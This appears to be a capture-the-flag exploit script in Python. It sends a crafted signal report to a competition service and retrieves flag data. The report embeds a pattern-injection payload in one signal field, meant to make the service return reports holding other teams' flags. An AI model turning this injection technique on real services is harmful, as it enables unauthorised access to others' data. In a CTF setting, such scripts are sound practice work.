import logging

from shared import encode_signal_data, make_conn

# CHANGE THIS
TARGET_SOURCE = "SHH5 LK.s/1"
FLAG_PREFIX = "FLAG_"

c, user, password = make_conn()
report = f"""%Interference%
FuO9wPCTixKYtHgQt5e4x4poDHSPbNCo$Ship "Foxtrot Uniform Oscar"
%Signals%
!0!uL7A Cm.NA/2:UmFuZG9tIGRhdGEuLi4=
!1!xxxxx)|(    {TARGET_SOURCE}[9-;]{FLAG_PREFIX})|(xxxxx:UmFuZG9tIGRhdGEuLi4=
%End%
"""

c.send_line(f"report {encode_signal_data(report.encode(), b'x').hex()}")
logging.info("Sent report")

c.recv_until("Key=")
key = c.recv_until(" ").decode()
c.recv_until("ID=")
id = c.recv_line().decode()
logging.info("Received report info (%s:%s)", id, key)

c.send_line(f"retrieve {key} {id}")
report = c.recv_until("=== Report end ===", False).decode()
print(report)
